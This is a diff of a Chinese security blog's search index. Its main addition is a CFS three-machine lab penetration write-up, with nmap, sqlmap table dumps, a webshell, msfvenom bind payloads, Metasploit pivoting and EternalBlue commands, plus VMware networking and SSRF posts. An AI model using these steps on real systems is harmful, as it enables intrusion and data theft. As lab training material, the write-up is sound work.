@@ -1,6 +1,255 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SSRF</title>
+    <url>/2022/04/04/SSRF/</url>
+    <content><![CDATA[<h1 id="一、什么是SSRF"><a href="#一、什么是SSRF" class="headerlink" title="一、什么是SSRF"></a>一、什么是SSRF</h1><p>SSRF（server-side request forgery，服务端请求伪造），这是一个由攻击者构造请求，服务器发起请求的安全漏洞，就是让服务器去请求你通常请求不到的东西</p>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CFS三层靶机内网渗透</title>
+    <url>/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</url>
+    <content><![CDATA[<h1 id="一、靶场环境"><a href="#一、靶场环境" class="headerlink" title="一、靶场环境"></a>一、靶场环境</h1><p>这个环境是由三台机器组成的一个内网，网络拓扑图如下</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/拓扑.png" alt></p>
+<p>渗透的大致流程：攻击机和Target1位于同一网段，因此先把Target1拿下，然后以Target1为跳板，攻击内网中的Target2，然后同理以Target2为跳板攻击Target3。</p>
+<p>注意：Target2和Target3位于内网中，彼此可以通信，但是无法连接外网</p>
+<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="1、网卡配置"><a href="#1、网卡配置" class="headerlink" title="1、网卡配置"></a>1、网卡配置</h2><p>该环境需要由三块网卡搭建，编辑VMware的虚拟网络编辑器，网卡不够可以添加，在这我使用的是VM0、VM2、VM3，然后设置和下图一样：</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/网络.png" alt></p>
+<p>然后是配置网卡给攻击机和三个靶机</p>
+<p>攻击机kali：</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/kali.png" alt></p>
+<p>配置好后查看一下IP看是否在正确的网段、并记录一下信息</p>
+<blockquote>
+<p>kali攻击机</p>
+<p>ip：192.168.31.187</p>
+</blockquote>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/kaliIP.png" alt></p>
+<p>然后是Target1：</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/t1.png" alt></p>
+<p>配置好后也可以用作者给的登录密码登录进去查看一下IP</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/t1_.png" alt></p>
+<p>记录相关信息</p>
+<blockquote>
+<p>Target1</p>
+<p>登陆账号密码：root/teamssix.com</p>
+<p>ip1: 192.168.31.12</p>
+<p>ip2: 192.168.22.136</p>
+<p>宝塔登陆地址和密码：</p>
+<p>地址：<a href="http://192.168.31.12:8888/a768f109">http://192.168.31.12:8888/a768f109</a></p>
+<p>账号：eaj3yhsl</p>
+<p>密码：41bb8fee</p>
+</blockquote>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/t1IP.png" alt="Target1_ip"><strong>待改</strong></p>
+<p>同理，将Target2的网卡配置改为VM2和VM3，Target3的网卡为VM3</p>
+<p>然后查看一下IP是否正确</p>
+<blockquote>
+<p>Target 2</p>
+<p>登陆账号密码：root/teamssix.com</p>
+<p>ip1: 192.168.22.129</p>
+<p>ip2: 192.168.33.128</p>
+<p>宝塔登陆地址和密码</p>
+<p>地址：<a href="http://192.168.22.129:8888/2cc52ec0">http://192.168.22.129:8888/2cc52ec0</a></p>
+<p>账号：xdynr37d</p>
+<p>密码：123qwe..</p>
+</blockquote>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/t2IP.png" alt="Target2_ip"></p>
+<blockquote>
+<p>Target3</p>
+<p>登录密码：teamssix.com</p>
+<p>ip：192.168.33.33</p>
+</blockquote>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/t3IP.png" alt="Target3_ip"></p>
+<h2 id="2、宝塔配置"><a href="#2、宝塔配置" class="headerlink" title="2、宝塔配置"></a>2、宝塔配置</h2><p>首先打开Target1的宝塔地址，用给的账号密码登录进去</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/bt1.png" alt></p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/bt1_1.png" alt></p>
+<p>同理，打开Target2的宝塔地址，但是因为Target2位于22网段，我们无法访问，因此我们可以给Target2添加多一个网卡VM0，以便我们配环境</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/bt2_0.png" alt></p>
+<p>然后用这个新网卡的IP去访问这个宝塔地址：<a href="http://192.168.31.9:8888/2cc52ec0">http://192.168.31.9:8888/2cc52ec0</a></p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/bt2_1.png" alt></p>
+<p>然后设置好</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/bt2_2.png" alt></p>
+<p>然后把刚才给Target2添加的网卡删除即可</p>
+<h1 id="三、Target1"><a href="#三、Target1" class="headerlink" title="三、Target1"></a>三、Target1</h1><p>主机探活：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.31.0/24</span><br><span class="line">或</span><br><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_1.png" alt></p>
+<p>查看端口开放情况：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -T4 -Pn 192.168.31.12</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_2.png" alt></p>
+<p>访问一下80端口，很明显是ThinkPHP 5.x 框架</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_3.png" alt></p>
+<p>拿出专用工具扫描一下，发现存在RCE</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_4.png" alt></p>
+<p>传马、然后蚁剑连上</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_5.png" alt></p>
+<p>随便翻下目录，发现在robots.txt、flag21sA.txt中存在flag</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_6.png" alt></p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_7.png" alt></p>
+<p>然后先反弹一下shell吧，可以通过msfvenom生成Linux马，然后上传再连就行。</p>
+<p>我这里就直接通过metaploit里面的模块直接对它进行攻击</p>
+<p>进入msf，找到ThinkPHP的漏洞利用模块</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_8.png" alt></p>
+<p>设置好相关信息即可拿到shell</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_9.png" alt></p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_10.png" alt></p>
+<p>拿到shell的第一时间是提权，于是我去尝试了一些提权的方法，但并没有成功。</p>
+<p>信息收集时查看IP或者网络接口情况，发现存在22网段</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>
+<p>但是kali在31网段，无法进行通信。为了让我们的kali能和22网段的计算机进行通信，就要使用<strong>Socks</strong>代理服务。</p>
+<blockquote>
+<p>Socks是一种代理服务，可以简单地将一端的系统连接到另外一端。支持多种协议，包括http、ftp请求及其它类型的请求。</p>
+<p>Socks在渗透测试中能够很方便的让我们与目标内网计算机之间通信。</p>
+</blockquote>
+<p>因为要访问到22网段，首先添加路由，也就是开路</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_14.png" alt></p>
+<p>然后把当前session挂起，然后调用socks代理模块，可以查看一下配置，缺什么就加什么</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set SRVHOST 0.0.0.0</span><br><span class="line">set SRVPORT 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_15.png" alt></p>
+<p>开启了socks代理后，Linux中有个自带的工具可以利用本地的代理接口进行访问，就是proxychains</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+<p>把最下面的ip改成本机ip（kali）以及刚刚设置的端口号</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_16.png" alt></p>
+<p>然后在kali中要访问22网段或者用工具对22网段进行探测时，前面都要加上proxychains</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">例如：proxychains nmap 192.168.22.129</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>但是不能通过<code>proxychains nmap -sP 192.168.22.0/24</code>这种命令来找存活主机，因为这是通过ping扫来发现主机，但走代理的两台主机是无法ping通的</p>
+</blockquote>
+<p>那我们如何找到22网段下的存活主机呢？因为Target1有一个22网段的网卡，因此它能够和22网段的主机通信、也就是能互相ping，因此我们在这台主机上写入一个sh文件：</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_11.png" alt></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>((i=1;i&lt;=255;i++)); </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="comment">#PING并保留丢包数</span></span><br><span class="line">        p=`ping -c 1 192.168.31.<span class="variable">$i</span>|grep loss|awk <span class="string">&#x27;&#123;print $6&#125;&#x27;</span>|awk -F <span class="string">&quot;%&quot;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">            <span class="comment">#因为只PING一次，丢包数为0则表示成功，否则失败</span></span><br><span class="line">            <span class="keyword">if</span> [ <span class="variable">$p</span> -eq 0 ]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;192.168.22.<span class="variable">$&#123;i&#125;</span>|true&quot;</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;192.168.22.<span class="variable">$&#123;i&#125;</span>|fail&quot;</span></span><br><span class="line">	    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>添加权限：<code>chmod 777 ping.sh</code></p>
+<p>然后运行shell脚本即可</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_12.png" alt></p>
+<p>成功找到存活主机：</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/ping.png" alt></p>
+<p>然后就可以开始信息收集了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.22.129</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意：这里必须加上Pn参数，也就是禁止ping扫，默认该主机存活；</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果没加上这个参数那么nmap就只会返回该主机不存活</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_17.png" alt></p>
+<p>然后如果想要在浏览器上也访问的话，只需要在浏览器上设置一下代理即可</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_13.png" alt></p>
+<p>上面是在Linux中的情况，如果想用Windows 也就是我们的物理机访问到22网段的话，可以借助一个软件：SocksCap64</p>
+<p>点开代理</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/sockscap1.png" alt></p>
+<p>添加代理</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/sockscap2.png" alt></p>
+<p>最后在这里加入想要访问的浏览器，以及要使用的工具即可</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/sockscap3.png" alt></p>
+<h1 id="四、Target2"><a href="#四、Target2" class="headerlink" title="四、Target2"></a>四、Target2</h1><p>开放了80端口，访问一下</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_1.png" alt></p>
+<p>发现是一个CMS的官网，指纹识别也没找到有用信息，信息收集一下发现robots.txt中存在一个路径</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_2.png" alt></p>
+<p>以及在查看源代码时发现了hint</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_3.png" alt></p>
+<p>先访问一下这个路径，虽然猜也猜得出是一个后台登录界面</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_4.png" alt></p>
+<p>那么思路就清楚了，首先通过SQL注入得到管理员账号密码，然后就可以登录后台了</p>
+<p>sqlmap开跑</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p &quot;keyword&quot; --dbs</span><br><span class="line">proxychains sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p &quot;keyword&quot; -D &quot;bagecms&quot; --tables</span><br><span class="line">proxychains sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p &quot;keyword&quot; -D &quot;bagecms&quot; -T &quot;bage_admin&quot; --columns</span><br><span class="line">proxychains sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p &quot;keyword&quot; -D &quot;bagecms&quot; -T &quot;bage_admin&quot; -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure>
+<p>成功得到账号密码：</p>
+<blockquote>
+<p>admin / 123qwe</p>
+</blockquote>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_5.png" alt></p>
+<p>登录进来后即可看到flag</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_6.png" alt></p>
+<p>然后随便翻翻发现在模板这里可以编辑php文件，那就写入木马然后蚁剑连接</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_7.png" alt></p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_8.png" alt></p>
+<p>找到木马所在的URL</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_9.png" alt></p>
+<p>成功连接</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_10.png" alt></p>
+<p>然后就是和Target1一样的思路，添加33网段的路由，但这个操作要在msf中执行，因此先反弹shell。</p>
+<p>因为该主机位于22网段、是无法访问外网的，因此让它主动连接我们是走不通的、只能通过正向连接。</p>
+<p>生成Linux木马：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp lport=3333 -f elf -o shell.elf</span><br><span class="line"><span class="comment"># bind_tcp是正向连接</span></span><br><span class="line"><span class="comment"># 注意是x64，可以通过简单的信息收集知道</span></span><br></pre></td></tr></table></figure>
+<p>msf开启监听：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 192.168.22.129</span><br><span class="line"><span class="built_in">set</span> LPORT 3333</span><br></pre></td></tr></table></figure>
+<p>在蚁剑中把该文件上传</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_11.png" alt></p>
+<p>蚁剑中打开终端，给该文件增加权限，然后运行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 777 shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>
+<p>成功连接</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_12.png" alt></p>
+<p>同样的、信息收集、查看网络，发现还有一个33网段，那么继续添加路由</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run get_local_subnets</span><br><span class="line">run autoroute -s 192.168.33.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+<p>然后通过之前的ping.sh来发现33网段的存活主机</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/ping2.png" alt></p>
+<h1 id="五、Target3"><a href="#五、Target3" class="headerlink" title="五、Target3"></a>五、Target3</h1><p>信息收集，找到开放端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.33.33</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/5_1.png" alt>（)</p>
+<p>445端口开放、并且是Windows系统，也许可能存在永恒之蓝</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.33.33</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/5_2.png" alt></p>
+<p>成功拿到sessions后就可以执行任意命令了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">chcp 65001  # 如果出现乱码，输入这个修改编码即可</span><br></pre></td></tr></table></figure>
+<p>然后就是寻找flag文件即可</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd / # 回到根目录</span><br><span class="line">dir *flag* /s /b</span><br><span class="line"><span class="meta">#</span><span class="bash"> /s是指列出当前目录包含子目录下的所有文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> /b是列出文件名称</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/5_3.png" alt></p>
+<p>最后用type命令进行查看</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">type C:\Users\Administrator\Desktop\flag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/5_4.png" alt></p>
+<h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><ol>
+<li>第一次搭建内网靶场环境，不是很熟悉，搭了一晚上才搭好。</li>
+<li>打靶机的过程也花了好长时间，msf不知道为什么第一个session总是断开；而连接第二个靶机时总是不稳定、蚁剑时而连的上时而连不上。</li>
+<li>内网漫游：配置socks代理、通过第一个已建立起来的session去访问其内网下的主机。</li>
+<li>两台主机通过走代理来通信是无法ping通的。</li>
+</ol>
+<h1 id="七、参考文章"><a href="#七、参考文章" class="headerlink" title="七、参考文章"></a>七、参考文章</h1><p><a href="https://teamssix.com/191021-211425.html#toc-heading-6">CFS三层靶机搭建及其内网渗透【附靶场环境】 | TeamsSix</a></p>
+<p><a href="https://blog.csdn.net/qq_61237064/article/details/125602997"> CFS三层靶机搭建及其内网渗透_ZredamanJ的博客-CSDN博客</a></p>
+<p><a href="https://www.freebuf.com/articles/web/326772.html">代理技术应用之三层内网漫游 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/59535740">内网漫游之SOCKS代理大结局 - 知乎 (zhihu.com)</a></p>
+<p><a href="https://blog.csdn.net/m0_55793759/article/details/126514312">论后渗透MSF之 | 添加路由和代理<em>msf添加路由</em>迷途羔羊pro的博客-CSDN博客</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/166375631">linux命令行代理神器-proxychains - 知乎 (zhihu.com)</a></p>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>桥接模式、NAT模式和仅主机模式</title>
+    <url>/2022/10/07/VMnet/</url>
+    <content><![CDATA[<h1 id="一、VMware网络"><a href="#一、VMware网络" class="headerlink" title="一、VMware网络"></a>一、VMware网络</h1><p>在我们安装 VMware 虚拟机后，在 PC 网络连接中会多出两个虚拟网卡：</p>
+<p><img src="/2022/10/07/VMnet/1.png" alt></p>
+<p>简单说明一下 VMware 的几个虚拟设备</p>
+<ol>
+<li><strong>VMnet0</strong>：用于虚拟桥接网络下的虚拟交换机</li>
+<li><strong>VMnet1</strong>：用于虚拟 Host-Only（仅主机）网络下的虚拟交换机</li>
+<li><strong>VMnet8</strong>：用于虚拟 NAT 网络下的虚拟交换机</li>
+<li><strong>VMware NetworkAdepter VMnet1</strong>：Host 用于与 Host-Only 虚拟网络进行通信的虚拟网卡</li>
+<li><strong>VMware NetworkAdepter VMnet8</strong>：Host 用于与 NAT 虚拟网络进行通信的虚拟网卡</li>
+</ol>
+<h1 id="二、网络连接"><a href="#二、网络连接" class="headerlink" title="二、网络连接"></a>二、网络连接</h1><h2 id="1、桥接模式（Bridged-Networking）"><a href="#1、桥接模式（Bridged-Networking）" class="headerlink" title="1、桥接模式（Bridged Networking）"></a>1、桥接模式（Bridged Networking）</h2><p>桥接模式是指本地物理网卡和虚拟网卡通过 VMnet0 虚拟交换机进行桥接，那么物理网卡和虚拟网卡就相当于处于同一个网段，因此该虚拟机和 PC 是处于同一网段的：</p>
+<p><img src="/2022/10/07/VMnet/2.png" alt></p>
+<p>因此该虚拟机中的虚拟网卡可以通过 PC 中的物理网卡直接访问到外部网络，就相当于在局域网中新增了一台计算机，它可以访问这个局域网内的所有主机，大致联网过程如下图：</p>
+<p><img src="/2022/10/07/VMnet/3.png" alt></p>
+<h2 id="2、NAT模式"><a href="#2、NAT模式" class="headerlink" title="2、NAT模式"></a>2、NAT模式</h2><p>NAT（网络地址转换），使用 NAT 模式时，VMware 会通过 PC 中的 VMware NetworkAdepter VMnet8 虚拟网卡直接连接到 VMnet8 虚拟交换机上与虚拟网卡进行通信，但 VMware NetworkAdepter VMnet8 虚拟网卡仅作为 PC 和虚拟机通信的接口，虚拟机并不会通过它来联网。</p>
+<p>因此虚拟机会虚拟出一个虚拟 NAT 服务器，并将虚拟 NAT 设备和虚拟 DHCP 服务器连接到 VMnet8 虚拟交换机上，而物理网卡直接与虚拟 NAT 设备相连，这样就实现了虚拟机联网</p>
+<p><img src="/2022/10/07/VMnet/4.png" alt></p>
+<p>当虚拟机向互联网发送请求数据包时，都会经过虚拟 NAT 服务器进行处理，然后以 PC 的名义进行发送。而互联网发送的请求数据包也都会先被 PC 接收，然后交给虚拟 NAT 服务器进行处理并分发给对应的虚拟机。</p>
+<p>因此虚拟机在互联网中不必具有自己的 IP 地址，因为在互联网中，<strong>该 PC 和虚拟机是共享同一个 IP 地址</strong>，一般情况下，互联网设备也不能访问到该虚拟机。但同一个 PC 里的多个采用 NAT 模式连接的虚拟机之间是可以相互访问的，因为一台 PC 上只能够存在一个 NAT 模式的虚拟网络。</p>
+<h2 id="3、仅主机模式（Host-Only）"><a href="#3、仅主机模式（Host-Only）" class="headerlink" title="3、仅主机模式（Host-Only）"></a>3、仅主机模式（Host-Only）</h2><p>该模式其实就是 NAT 模式去除虚拟 NAT 设备，然后使用 VMware NetworkAdepter VMnet1 虚拟网卡与 VMnet1 虚拟交换机进行连接来与虚拟机通信，仅主机模式模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。</p>
+<p><img src="/2022/10/07/VMnet/5.png" alt></p>
+]]></content>
+      <categories>
+        <category>基础知识和笔记</category>
+      </categories>
+      <tags>
+        <tag>VMware</tag>
+        <tag>learn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>RCE绕过</title>
     <url>/2022/09/30/RCE/</url>
     <content><![CDATA[<h1 id="一、PHP命令执行函数"><a href="#一、PHP命令执行函数" class="headerlink" title="一、PHP命令执行函数"></a>一、PHP命令执行函数</h1><ul>
@@ -130,51 +379,6 @@
       </categories>
       <tags>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSRF</title>
-    <url>/2022/04/04/SSRF/</url>
-    <content><![CDATA[<h1 id="一、什么是SSRF"><a href="#一、什么是SSRF" class="headerlink" title="一、什么是SSRF"></a>一、什么是SSRF</h1><p>SSRF（server-side request forgery，服务端请求伪造），这是一个由攻击者构造请求，服务器发起请求的安全漏洞，就是让服务器去请求你通常请求不到的东西</p>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>桥接模式、NAT模式和仅主机模式</title>
-    <url>/2022/10/07/VMnet/</url>
-    <content><![CDATA[<h1 id="一、VMware网络"><a href="#一、VMware网络" class="headerlink" title="一、VMware网络"></a>一、VMware网络</h1><p>在我们安装 VMware 虚拟机后，在 PC 网络连接中会多出两个虚拟网卡：</p>
-<p><img src="/2022/10/07/VMnet/1.png" alt></p>
-<p>简单说明一下 VMware 的几个虚拟设备</p>
-<ol>
-<li><strong>VMnet0</strong>：用于虚拟桥接网络下的虚拟交换机</li>
-<li><strong>VMnet1</strong>：用于虚拟 Host-Only（仅主机）网络下的虚拟交换机</li>
-<li><strong>VMnet8</strong>：用于虚拟 NAT 网络下的虚拟交换机</li>
-<li><strong>VMware NetworkAdepter VMnet1</strong>：Host 用于与 Host-Only 虚拟网络进行通信的虚拟网卡</li>
-<li><strong>VMware NetworkAdepter VMnet8</strong>：Host 用于与 NAT 虚拟网络进行通信的虚拟网卡</li>
-</ol>
-<h1 id="二、网络连接"><a href="#二、网络连接" class="headerlink" title="二、网络连接"></a>二、网络连接</h1><h2 id="1、桥接模式（Bridged-Networking）"><a href="#1、桥接模式（Bridged-Networking）" class="headerlink" title="1、桥接模式（Bridged Networking）"></a>1、桥接模式（Bridged Networking）</h2><p>桥接模式是指本地物理网卡和虚拟网卡通过 VMnet0 虚拟交换机进行桥接，那么物理网卡和虚拟网卡就相当于处于同一个网段，因此该虚拟机和 PC 是处于同一网段的：</p>
-<p><img src="/2022/10/07/VMnet/2.png" alt></p>
-<p>因此该虚拟机中的虚拟网卡可以通过 PC 中的物理网卡直接访问到外部网络，就相当于在局域网中新增了一台计算机，它可以访问这个局域网内的所有主机，大致联网过程如下图：</p>
-<p><img src="/2022/10/07/VMnet/3.png" alt></p>
-<h2 id="2、NAT模式"><a href="#2、NAT模式" class="headerlink" title="2、NAT模式"></a>2、NAT模式</h2><p>NAT（网络地址转换），使用 NAT 模式时，VMware 会通过 PC 中的 VMware NetworkAdepter VMnet8 虚拟网卡直接连接到 VMnet8 虚拟交换机上与虚拟网卡进行通信，但 VMware NetworkAdepter VMnet8 虚拟网卡仅作为 PC 和虚拟机通信的接口，虚拟机并不会通过它来联网。</p>
-<p>因此虚拟机会虚拟出一个虚拟 NAT 服务器，并将虚拟 NAT 设备和虚拟 DHCP 服务器连接到 VMnet8 虚拟交换机上，而物理网卡直接与虚拟 NAT 设备相连，这样就实现了虚拟机联网</p>
-<p><img src="/2022/10/07/VMnet/4.png" alt></p>
-<p>当虚拟机向互联网发送请求数据包时，都会经过虚拟 NAT 服务器进行处理，然后以 PC 的名义进行发送。而互联网发送的请求数据包也都会先被 PC 接收，然后交给虚拟 NAT 服务器进行处理并分发给对应的虚拟机。</p>
-<p>因此虚拟机在互联网中不必具有自己的 IP 地址，因为在互联网中，<strong>该 PC 和虚拟机是共享同一个 IP 地址</strong>，一般情况下，互联网设备也不能访问到该虚拟机。但同一个 PC 里的多个采用 NAT 模式连接的虚拟机之间是可以相互访问的，因为一台 PC 上只能够存在一个 NAT 模式的虚拟网络。</p>
